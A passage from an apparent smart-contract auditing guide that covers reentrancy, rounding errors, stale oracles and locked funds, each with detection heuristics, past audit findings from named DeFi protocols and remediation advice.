Isomorph's `_checkIfCollateralIsActive` was called by all four core functions including `closeLoan` and `increaseCollateralAmount`, meaning a stale Lyra oracle price circuit-breaker permanently blocked every user action-including full repayments that required no price information-leaving borrowers unable to exit positions while interest continued to compound. Reserve Protocol's staking contract allowed new stake deposits during paused/frozen states, but withdrawals were blocked; this asymmetry allowed stake to enter but not exit, trapping new depositors. A separate Reserve finding showed that governance changes to `unstakingDelay` affected users who had already submitted withdrawal requests, retroactively extending their wait time.

**Remediation Notes**
- Remove the pause guard from `closeLoan`, `repayDebt`, and `increaseCollateralAmount`; these functions only improve position health and do not require price validation when the repayment covers all outstanding debt
- Freeze interest accrual atomically with the pause by updating `lastUpdateTime` to the pause timestamp and resetting it to `block.timestamp` on unpause
- Block parameter changes that worsen user positions (increased fees, reduced collateral factors) during a paused state

---

### Reentrancy via Token Callbacks (ref: fv-sol-1)

**Protocol-Specific Preconditions**
- Privacy protocol's redeem function transfers multiple tokens in a loop before all internal state (total supply, basket state, nullifier commitments) is finalized
- ERC-777 tokens with `tokensReceived` hooks are accepted as shielded assets, enabling re-entry between the balance decrement and the nullifier registration
- Callback-based borrow, lend, or mint functions invoke `msg.sender` before updating note commitments or liquidity state

**Detection Heuristics**
- Identify all external token transfers in redemption and withdrawal loops; verify that all internal state is finalized before the loop begins, not after
- Check if `nonReentrant` is applied to all functions that invoke external callbacks (`ITimeswapMintCallback`, `onERC1155Received`, etc.)
- Verify that note commitments and nullifiers are registered before any external token transfer in deposit/withdrawal flows
- Search for ERC-777 token support; any `tokensReceived` hook can re-enter before state is committed

**False Positives**
- Protocol supports only well-known tokens (USDC, WETH) with no callback mechanisms, enforced by an allowlist
- Strict CEI is maintained throughout and all state is finalized before any external call
- `nonReentrant` covers all relevant entry points globally, not just individual functions

**Notable Historical Findings**
Reserve Protocol's `redeem` function transferred basket tokens to the user in a loop before finalizing `basketsNeeded` and other supply invariants, allowing an ERC-777 token recipient to re-enter `redeem` with stale supply state and extract more than their proportional share. Beanstalk's `FarmFacet` allowed re-entry during multi-step pipeline execution, enabling an attacker to drain intermediate value that accumulated during the pipeline handoff. Timeswap's `mint`, `lend`, `borrow`, and `pay` functions all invoked callbacks to `msg.sender` before completing their critical state updates (liquidity balances, fee accruals, debt positions), making every core function a reentrancy vector.

**Remediation Notes**
- Finalize all state updates (burn, supply reduction, nullifier/commitment updates) before beginning any external transfer loop
- Apply `nonReentrant` to every callback-invoking function (`mint`, `lend`, `borrow`, `redeem`, `pay`)
- For batch redemptions, split the function into a pure effects phase (update all internal state) and a pure interactions phase (execute all transfers)

---

### Rounding and Truncation Errors (ref: fv-sol-2)

**Protocol-Specific Preconditions**
- Two different code paths compute the same aggregate collateral value using different aggregation orders (sum-then-price vs. price-each-then-sum), producing inconsistent results that can be exploited in comparison checks
- Virtual price (interest accumulator) updates use `block.timestamp` rather than truncating to the nearest interval boundary, permanently losing fractional time that should have been rolled forward
- Token precision multipliers computed as `10**(18 - decimals)` round to zero for tokens with more than 18 decimals, breaking pool math entirely

**Detection Heuristics**
- Find pairs of functions that compute the same logical value and verify they use identical aggregation order and rounding direction
- Search for `_updateVirtualPrice` or equivalent that stores `block.timestamp` after a truncated interval calculation; the stored time should be `truncatedIntervals * interval`, not `block.timestamp`
- Look for `customPrecisionMultipliers = 10**(18 - decimals)` without a guard against `decimals > 18`
- Identify all division operations where the result is later used in a comparison; ensure rounding direction is consistent between the two compared values

**False Positives**
- Truncation errors are within a documented dust threshold and cannot be amplified
- Protocol explicitly uses `mulDiv` for full-precision arithmetic throughout
- The aggregation-order difference is known and the comparison uses a dust-tolerance allowance to absorb the discrepancy

**Notable Historical Findings**
Isomorph's liquidation check compared `proposedAmount` (computed by pricing each NFT individually, truncating N times) against `totalCollateralValue` (computed by summing all NFTs then pricing once, truncating once), producing systematic differences that could prevent full liquidation even when the loan was deeply underwater. The same protocol's `_updateVirtualPrice` stored `_currentBlockTime` after computing interest for only truncated intervals, permanently discarding the fractional seconds remainder and under-accruing interest on every update cycle. Boot Finance's `customPrecisionMultipliers` calculation produced zero for any token with more than 18 decimals, causing division-by-zero or zero-value transfers that completely broke the pool for those token pairs.

**Remediation Notes**
- Standardize all collateral valuation paths to use the same aggregation order: sum all units first, then apply a single price conversion
- Store `(block.timestamp / interval) * interval` as the updated time, not `block.timestamp`, to ensure the accumulator advances in exact interval steps
- Guard precision multiplier calculations with `require(decimals <= 18, "Unsupported decimals")` or compute the inverse for tokens with more than 18 decimals

---

### Stale Oracle Data (ref: fv-sol-10)

**Protocol-Specific Preconditions**
- Oracle bounds (`tokenMinPrice`, `tokenMaxPrice`) are fetched from the Chainlink aggregator at deployment and stored as immutables; if Chainlink deploys a new aggregator with different bounds, the cached values become permanently stale
- Heartbeat staleness threshold is set to 24 hours for a feed that updates every 1 hour, allowing prices that are effectively stale to pass validation for 23 hours
- Oracle deprecation causes `latestRoundData()` or `refresh()` to revert unconditionally, permanently disabling the protocol path that depends on it

**Detection Heuristics**
- Search for `aggregator.minAnswer()` and `aggregator.maxAnswer()` stored in `immutable` variables in the constructor
- Verify staleness thresholds match the actual heartbeat for each specific Chainlink feed (not a single generic large value)
- Check `round completeness`: `answeredInRound >= roundID` must be verified in every `latestRoundData()` call
- Test oracle deprecation path: if the primary feed's `latestRoundData()` reverts, does the protocol halt permanently or fall back gracefully?

**False Positives**
- Oracle is used only for non-critical display purposes
- Protocol has admin-controlled manual price overrides that activate during oracle failures
- Staleness window is generous but acceptable within the protocol's epoch duration

**Notable Historical Findings**
Isomorph's oracle bounds were cached at construction time; when Chainlink deprecated an aggregator and deployed a replacement with updated min/max bounds, the cached bounds no longer matched the live feed-causing the protocol to either reject valid prices or accept invalid ones indefinitely. Reserve Protocol's `refresh()` function propagated an oracle deprecation exception upward without catching it, disabling the entire basket recollateralization path the first time any oracle in the basket was deprecated. A separate Reserve finding showed that `Asset.lotPrice()` did not fall back to a safe low price on oracle timeout, instead using a potentially stale cached price for asset sales, enabling significant underpayment to the protocol.

**Remediation Notes**
- Fetch aggregator bounds dynamically (`priceFeed.aggregator().minAnswer()`) on every oracle query rather than caching them at construction
- Set heartbeat thresholds per-feed based on documented update frequencies, not a single global constant
- Wrap all oracle calls in `try/catch` and route failures to a fallback price source or a safe degraded mode that halts new operations while allowing existing position closures

---

### Stuck or Permanently Locked Funds (ref: fv-sol-9)

**Protocol-Specific Preconditions**
- The only withdrawal path calls `priceCollateralToUSD` which reverts when the oracle price falls outside its min/max bounds, permanently locking all collateral for affected users
- A failed prior proposal in an NFT fractionalization or escrow contract leaves the contract in a state where no new proposal can be executed and funds cannot be recovered
- A single collateral type whose oracle becomes permanently unavailable prevents `rebalance()` from executing, blocking the entire basket

**Detection Heuristics**
- Trace all withdrawal and redemption paths and verify at least one path remains functional when external dependencies (oracle, external protocol) revert
- Check if oracle out-of-bounds conditions block full-repayment paths where collateral pricing is not economically necessary
- Search for contracts that receive tokens with no `rescueTokens` or `sweep` function for accidentally deposited assets
- Verify that a single failing basket component is handled gracefully (try/catch continuation) rather than blocking all basket operations

**False Positives**
- Admin emergency withdrawal function exists and bypasses normal checks
- Stuck condition is temporary and self-resolving (oracle will update within the heartbeat window)
- Governance mechanism can migrate or rescue stuck funds within a bounded time frame

**Notable Historical Findings**
Isomorph's `closeLoan` always called `_calculateProposedReturnedCapital` even when the user was repaying their entire debt and no collateral pricing was needed; when the oracle price moved outside bounds, this single check permanently locked all collateral for every user of the affected collateral type. Tessera's `OptimisticListingSeaport` could enter a permanently stuck state if a new proposal was created while an active proposal was being executed, leaving both proposals irreconcilable and all fractionalized NFT proceeds inaccessible. Reserve Protocol identified that if a single collateral asset in the basket behaved unexpectedly (oracle revert, non-standard behavior), the entire `RToken` would become permanently insolvent and unusable.

**Remediation Notes**
- For full-repayment closure paths, skip collateral valuation when `outstandingDebt == 0`; allow withdrawal of all collateral without any price check
- Add a `rescueTokens(IERC20 token, address to)` function that excludes the protocol's primary tokens and can recover accidentally deposited assets
- In basket rebalance loops, use `try/catch` around individual collateral price queries and emit a failure event for the affected asset rather than reverting the entire operation
